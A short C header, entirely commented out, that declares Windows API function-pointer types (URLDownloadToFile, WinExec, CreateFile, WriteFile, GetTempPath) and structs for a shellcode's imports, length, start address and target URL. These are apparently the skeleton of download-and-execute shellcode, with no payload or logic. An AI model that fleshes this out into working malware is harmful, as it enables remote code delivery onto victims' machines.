#ifndef __SHELL_CODE_H__
#define __SHELL_CODE_H__

/*
#ifndef _WIN64

typedef HANDLE (__stdcall *CREATEFILE)(LPCTSTR lpFileName, \
									   DWORD dwDesiredAccess, \
									   DWORD dwShareMode, \
									   LPSECURITY_ATTRIBUTES lpSecurityAttributes, \
									   DWORD dwCreationDisposition, \
									   DWORD dwFlagsAndAttributes, \
									   HANDLE hTemplateFile);
typedef BOOL (__stdcall *WRITEFILE)(HANDLE hFile, \
									 LPCVOID lpBuffer, \
									 DWORD nNumberOfBytesToWrite, \
									 LPDWORD lpNumberOfBytesWritten, \
									 LPOVERLAPPED lpOverlapped);
typedef HRESULT (__stdcall *CLOSEHANDLE)(HANDLE hHandle);
typedef BOOL (__stdcall *SHELLEXECUTEEX)(SHELLEXECUTEINFO *pExecInfo);
typedef UINT (__stdcall *WINEXEC)(LPCSTR lpCmdLine,UINT uCmdShow);
typedef HRESULT (__stdcall *URLDOWNLOADTOFILE)(LPUNKNOWN pCaller, \
												LPCTSTR szURL, \
												LPCTSTR szFileName, \
												DWORD dwReserved, \
												LPBINDSTATUSCALLBACK lpfnCB);
typedef DWORD (__stdcall *GETTEMPPATH)(DWORD nBufferLength,LPTSTR lpBuffer);

#else

typedef HANDLE (__fastcall *CREATEFILE)(LPCTSTR lpFileName, \
									   DWORD dwDesiredAccess, \
									   DWORD dwShareMode, \
									   LPSECURITY_ATTRIBUTES lpSecurityAttributes, \
									   DWORD dwCreationDisposition, \
									   DWORD dwFlagsAndAttributes, \
									   HANDLE hTemplateFile);
typedef BOOL (__fastcall *WRITEFILE)(HANDLE hFile, \
									 LPCVOID lpBuffer, \
									 DWORD nNumberOfBytesToWrite, \
									 LPDWORD lpNumberOfBytesWritten, \
									 LPOVERLAPPED lpOverlapped);
typedef HRESULT (__fastcall *CLOSEHANDLE)(HANDLE hHandle);
typedef BOOL (__fastcall *SHELLEXECUTEEX)(SHELLEXECUTEINFO *pExecInfo);
typedef UINT (__fastcall *WINEXEC)(LPCSTR lpCmdLine,UINT uCmdShow);
typedef HRESULT (__fastcall *URLDOWNLOADTOFILE)(LPUNKNOWN pCaller, \
										  LPCTSTR szURL, \
										  LPCTSTR szFileName, \
										  DWORD dwReserved, \
										  LPBINDSTATUSCALLBACK lpfnCB);
typedef DWORD (__fastcall *GETTEMPPATH)(DWORD nBufferLength,LPTSTR lpBuffer);







#endif


typedef struct _SHELL_CODE_IMPORT_KERNEL32
{
	WCHAR wKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',L'\0'};
	CREATEFILE ShellCodeCreateFile;
	WRITEFILE ShellCodeWriteFile;
	CLOSEHANDLE ShellCodeCloseHandle;
	WINEXEC ShellCodeWinExec;
	GETTEMPPATH ShellCodeGetTempPath;

}SHELL_CODE_IMPORT_KERNEL32,*PSHELL_CODE_IMPORT_KERNEL32;

typedef struct _SHELL_CODE_IMPORT_URLMON
{
	WCHAR wUrlMon[] = {'u','r','l','m','o','n','.','d','l','l',L'\0'};
	URLDOWNLOADTOFILE ShellCodeUrlDownloadToFile;
}SHELL_CODE_IMPORT_URLMON,*PSHELL_CODE_IMPORT_URLMON;

typedef struct _SHELL_CODE_PARAM
{
	ULONG ulShellCodeLength;
	PVOID pShellCodeStartAddress;
	SHELL_CODE_IMPORT_KERNEL32 ShellCodeImportKernel32;
	SHELL_CODE_IMPORT_URLMON ShellCodeImportUrlMon;
	WCHAR wUrl[MAX_PATH];
}SHELL_CODE_PARAM,*PSHELL_CODE_PARAM;
*/
#endif